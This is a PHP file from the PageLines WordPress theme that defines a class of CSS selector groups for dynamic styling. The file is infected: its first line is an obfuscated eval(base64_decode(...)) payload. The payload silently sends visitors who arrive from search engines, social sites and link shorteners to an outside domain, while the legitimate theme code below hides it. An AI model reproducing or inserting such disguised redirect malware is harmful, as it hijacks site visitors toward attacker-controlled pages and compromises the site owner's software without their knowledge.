<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * 
 *
 *  CSS Selector Groups 
 *  for dynamic CSS control
 *
 *  @package PageLines Core
 *  @subpackage Options
 *  @since 2.0.b6
 *
 */

class PageLinesCSSGroups{
	
	/**
	 * PHP5 constructor
	 */
	function __construct( ) {

		$this->s = $this->get_groups();

		add_filter('pagelines_css_group', array(&$this, 'extend_selectors'), 10, 2);

	}
	
	function extend_selectors($sel, $group){
		
		global $add_selectors;
		
		if(is_array($add_selectors) && !empty($add_selectors)){
			foreach($add_selectors as $key => $s){
				
				if($group == $s['group'])
					$sel .= ','.$s['sel'];
				
			}
		}
			
		return $sel;
			
	}
	
	function get_groups(){
		
		$s = array();

		/**
		 * Layout Width Control
		 */
		$s['page_width'] = 'body.fixed_width #page, body.fixed_width #footer, body.canvas .page-canvas'; 
		$s['content_width'] = '#site .content, .wcontent, #footer .content';

		/**
		 * Main Page Element Colors
		 */
		$s['bodybg'] = 'body, body.fixed_width';

		$s['pagebg'] = 'body #page';

		$s['contentbg'] = '.canvas .page-canvas, .thepage .content, .sf-menu li, #primary-nav ul.sf-menu a:focus, .sf-menu a:hover, .sf-menu a:active, .commentlist ul.children .even';
		
		$s['cascade'] = '.commentlist ul.children .even';

		$s['page_background_image'] = '.canvas #page, .full_width #page, body.fixed_width';

		/**
		 * Box & Element Colors
		 */
		$s['box_color_primary'] = '.bc1, .cnt-comments a, #wp-calendar caption, input, textarea, .searchform .searchfield, .wp-caption, .commentlist .alt, #wp-calendar #today, .post-nav, .current_posts_info, .post-footer, .success,  .content-pagination a .cp-num, .hentry table .alternate td, .playpause, #page .wp-pagenavi a';

		$s['box_color_secondary'] = '.bc2, .cnt-comments a:hover, #wp-calendar thead th, .item-avatar a, .comment blockquote, #page .wp-pagenavi a:hover, #page .wp-pagenavi .extend, .content-pagination .cp-num, .content-pagination a:hover .cp-num, ins';

		$s['box_color_tertiary'] = '.bc3, #page .wp-pagenavi .current, .alt #commentform textarea';

		$s['box_color_lighter'] = '.post-meta .c_img';

		/**
		 * Border Colors
		 */
		$s['border_layout'] = 'hr, .fpost, .clip_box, .widget-title, .metabar a, #morefoot .widget-title, #site #dsq-content h3, .navigation_wrap, .setup_area, .fpost .post-thumb img, .clip .clip-thumb img, .author-thumb img';
		$s['border_layout_darker'] = '.bldrk';
		$s['border_layout_lighter'] = '.bllt';
		
		$s['border_primary'] = 'blockquote, input, textarea, .searchform .searchfield, .wp-caption, #soapbox .fboxinfo, .post-meta .c_img';
		$s['border_primary_darker'] = '.bpdrk';
		$s['border_primary_lighter'] = '.bplt';

		$s['border_secondary'] = '';

		$s['border_tertiary'] = 'textarea:focus';

		$s['border_primary_shadow'] = '.bc1s, input, textarea, .searchform .searchfield, .wp-caption, fpost .post-thumb img, .clip .clip-thumb img, .author-thumb img';

		$s['border_primary_highlight'] = '.bc1h, .bhighlight';

		/**
		 * Text Colors
		 */
		$s['headercolor'] = 'h1, h2, h3, h4, h5, h6, h1 a, h2 a, h3 a, h4 a, h5 a, h6 a, a.site-title, .entry-title a, .entry-title a:hover, .widget-title a:hover, h3.widget-title a:hover';

		$s['text_primary'] = '.tc1, .t1, .t1 a,  body #page .t1:hover, #page, .tcolor1, #subnav ul li a:active, .commentlist cite a, .metabar a:hover, .post-nav a:hover, .post-footer a, #site #dsq-content .dsq-request-user-info td a, #page .wp-pagenavi a:hover, #page .wp-pagenavi .current,  .content-pagination a:hover .cp-num';

		$s['text_secondary'] = '.tc2, .t2, .cnt-comments a, .cnt-comments a:hover, .tcolor2, .lcolor2 a, .subhead, .widget-title, #branding .site-description, #callout, #commentform .required, #postauthor .subtext, #page .wp-pagenavi span.pages, .commentlist .comment-meta  a, .content-pagination span, .content-pagination a .cp-num, .comment.alt .comment-author, .tcolor3, .lcolor3 a, .main_nav a, .widget-title a, h3.widget-title a, #subnav_row li a, .metabar em, .metabar a, .tags, #commentform label, .form-allowed-tags code, .rss-date, .comment.alt, .reply a,  .post-footer, .auxilary a, .cform .emailreqtxt,.cform .reqtxt, #page .wp-pagenavi a, #page .wp-pagenavi .current, #page .wp-pagenavi .extend';

		$s['text_tertiary'] = '.tc3, .t3';

		$s['text_box'] = '.post-nav a, .post-nav a:visited, #wp-calendar caption, .searchform .searchfield, .main_nav .current-menu-item a, .main_nav li a:hover, .main_nav li a:hover, #wp-calendar thead th, textarea';

		$s['text_box_secondary'] = '';

		$s['linkcolor'] = 'a, #subnav_row li.current_page_item a, #subnav_row li a:hover, .branding h1 a:hover';

		$s['linkcolor_hover'] = 'a:hover, .commentlist cite a:hover, .headline h1 a:hover';

		$s['footer_text'] = '#footer, #footer li.link-list a, #footer .latest_posts li .list-excerpt';
		$s['footer_highlight'] = '#footer a, #footer .widget-title,  #footer li h5 a';

		/**
		 * Text Shadows & Effects 
		 */
		$s['text_shadow_color']	= '';
		$s['footer_text_shadow_color'] = '#footer, .fixed_width #footer';

		/**
		 * Typography 
		 */
		$s['type_headers'] = '.thead, h1, h2, h3, h4, h5, h6, .site-title';
		$s['type_primary'] = '.f1, .font1, body, .font1, .font-primary, .commentlist';
		$s['type_secondary'] = '.f2, .font2, .font-sub, ul.main-nav, #secondnav, .metabar, .subtext, .subhead, .widget-title, .reply a, .editpage, #page .wp-pagenavi, .post-edit-link, #wp-calendar caption, #wp-calendar thead th, .soapbox-links a, .fancybox, .standard-form .admin-links, .pagelines-blink, .ftitle small';
		$s['type_inputs'] = 'input[type="text"], input[type="password"], textarea, #dsq-content textarea';
		
		return $s;
		
	}


	public function get_css_group( $group ){		
		
		if( is_array($group) ){
			
			$sel = '';
			
			foreach($group as $g)
				$sel .= $this->return_group( $g );

			return $sel;

		} else
			return $this->return_group( $group );
		
	}
	
	function return_group( $g ){
		
		if( isset( $this->s[ $g ] ) )
			return apply_filters('pagelines_css_group', $this->s[ $g ], $g);
		else	
			return apply_filters('pagelines_css_group_'.$g, '');
			
	}
	
}

function cssgroup( $group ){
	
	global $css_groups;

	if(!isset($css_groups))
		$GLOBALS['css_groups'] = new PageLinesCSSGroups();

	$get = $css_groups->get_css_group( $group );
	
	return $get;
}


function pl_add_selectors( $group, $selectors ){

	global $add_selectors;
	
	$add_selectors[] = array( 'group' => $group, 'sel' => $selectors);

	
}

